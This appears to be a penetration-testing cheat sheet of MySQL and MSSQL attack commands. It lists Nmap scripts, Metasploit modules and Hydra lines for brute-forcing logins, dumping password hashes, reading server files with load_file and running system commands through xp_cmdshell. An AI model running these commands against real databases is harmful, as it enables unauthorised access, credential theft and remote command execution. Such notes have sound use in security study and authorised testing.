SQL (Structured Query Language) is language used for RDBMS (Relational Database Management System). MySQL is a database service that use SQL.

# Tools

## MySQL

### MySQL CLI
```
mysql -h IP_ADDRESS -u USER
> show databases;
> use DB_NAME;
> select load_file("FILE");
```

### Metasploit
```
auxiliary/scanner/mysql/mysql_writable_dirs
-> /usr/share/metasploit-framework/data/wordlists/directory.txt (wordlist for module)
auxiliary/scanner/mysql/mysql_hashdump
auxiliary/scanner/mysql/mysql_login
```

### Nmap
```
nmap IP -sV -p3306 --script mysql-empty-password

nmap IP -sV -p3306 --script mysql-info

nmap IP -p3306 -sV --script mysql-users --script-args="mysqluser='USER',mysqlpass='PASS'"

nmap IP -p3306 -sV --script mysql-databases --script-args="mysqluser='USER',mysqlpass='PASS'"

nmap IP -p3306 -sV --script mysql-variables --script-args="mysqluser='USER',mysqlpass='PASS'"

nmap IP -sV -p3306 --script mysql-audit --script-args="mysql-audit.username='USER',mysql-audit.password='PASS',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'"

nmap IP -sV -p3306 --script mysql-dump-hashes --script-args="username='USER',password='PASS'"

nmap IP -sV -p3306 --script mysql-query --script-args="query='QUERY', username='USER',password='PASS'"
```

### Hydra
```
hydra -l USER -P wordlist IP_ADDRESS mysql
```

## MSSQL

### Nmap
```
nmap IP_ADDRESS -p 1433 --script ms-sql-info

nmap IP_ADDRESS -p 1433 --script ms-sql-ntlm-info --script-args msql.instance-port=1433

nmap IP_ADDRESS -p 1433 --script ms-sql-brute --script-args userdb=USERS,passdb=PASS
> /root/Desktop/wordlist/common_users.txt
> /root/Desktop/wordlist/100-common-passwords.txt

nmap IP_ADDRESS -p 1433 --script ms-sql-empty-password

nmap IP_ADDRESS -p 1433 --script ms-sql-query --script-args mssql.username=USER,mssql.password=PASS,ms-sql-query.query='SELECT * FROM master..syslogins' -oN output
> Show sysusers in a log (better view in text editor)

nmap IP_ADDRESS -p 1433 --script ms-sql-query --script-args mssql.username=USER,mssql.password=PASS,ms-sql-query.query='QUERY'

nmap IP_ADDRESS -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=USER,mssql.password=PASS

nmap IP_ADDRESS -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=USER,mssql.password=PASS,ms-sql-xp-cmdshell.cmd="COMMAND"
```

### Metasploit
```
auxiliary/scanner/mssql/mssql_login
auxiliary/admin/mssql/mssql_enum
auxiliary/admin/mssql/mssql_enum_logins
auxiliary/admin/mssql/mssql_exec
auxiliary/admin/mssql/mssql_enum_domain_accounts
```